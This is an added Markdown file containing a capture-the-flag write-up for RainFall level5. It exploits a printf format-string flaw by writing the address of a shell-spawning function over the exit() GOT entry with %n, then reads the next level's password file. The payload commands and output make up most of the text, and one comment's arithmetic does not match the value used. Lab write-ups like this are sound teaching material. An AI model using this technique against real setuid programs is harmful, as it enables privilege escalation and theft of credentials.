@@ -1,0 +1,86 @@
+
+```bash
+level5@RainFall:~$ ls -la
+-rwsr-s---+ 1 level6 users  5385 Mar  6  2016 level5
+
+level5@RainFall:~$ file level5 
+level5: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xed1835fb7b09db7da4238a6fa717ad9fd835ae92, not stripped
+```
+
+Reversed in c:
+```c
+void o(void)
+{
+    system("/bin/sh");
+    exit(1);
+}
+
+void n(void)
+{
+    char s[520];
+
+    fgets(s, 512, stdin);
+    printf(s);
+    exit(1);
+}
+
+int main(void)
+{
+    n();
+}
+```
+
+This is a basic `printf()` format vulnerability
+Here the user input is directly gived to `printf()`, allowing us to run formated string on it (`%p` `%s` `%n`) for exemple
+
+First we need to find o:
+```bash
+level5@RainFall:~$ gdb level5
+(gdb) info address o
+Symbol "o" is at 0x80484a4 in a file compiled without debugging.
+```
+
+Now let's look at the stack:
+```bash
+echo -ne "AAAA" > /tmp/payload_5
+printf '%%x %.0s' {1..20} >> /tmp/payload_5
+cat /tmp/payload_5 | ./level5 
+```
+Output:
+```bash
+AAAA200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 0
+```
+
+We can see that we have a the 4 possition
+To start `o()`, we just gonna change the value in the function entry table of `exit()` with the printf() format vulnerability
+
+For that we need the address of `exit()` in PLT, we can just look at the instruction to get it:
+```
+0x80484ff <n+61>        call   0x80483d0 <exit@plt>
+```
+If we take a look we can see `0xff253898 0x0408`, if remove the `jmp ds:` instruction and get `0x08049838`
+To double check we can read with readelf the entry:
+```
+level5@RainFall:~$ readelf --all level5 | grep exit
+08049828  00000207 R_386_JUMP_SLOT   00000000   _exit
+08049838  00000607 R_386_JUMP_SLOT   00000000   exit
+     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND _exit@GLIBC_2.0 (2)
+     6: 00000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.0 (2)
+    49: 00000000     0 FUNC    GLOBAL DEFAULT  UND _exit@@GLIBC_2.0
+    58: 00000000     0 FUNC    GLOBAL DEFAULT  UND exit@@GLIBC_2.0
+```
+
+The only thing that really mater is this jmp, we just gonna re-write it with the `o()` adress, so we write this on the `0x08049838` (`exit()`) PLT address:
+```bash
+echo -ne "\x38\x98\x04\x08" > /tmp/payload_5 #the address where we want to write
+echo -ne "%134513824d" >> /tmp/payload_5 # the value we want to write 134513828 (0x080484a4) - 6
+echo -ne "%4\$n" >> /tmp/payload_5 # finaly we use %n to set the value
+```
+
+We run it:
+```bash
+cat /tmp/payload_5 - | ./level5
+              512
+cat /home/user/level6/.pass                         
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
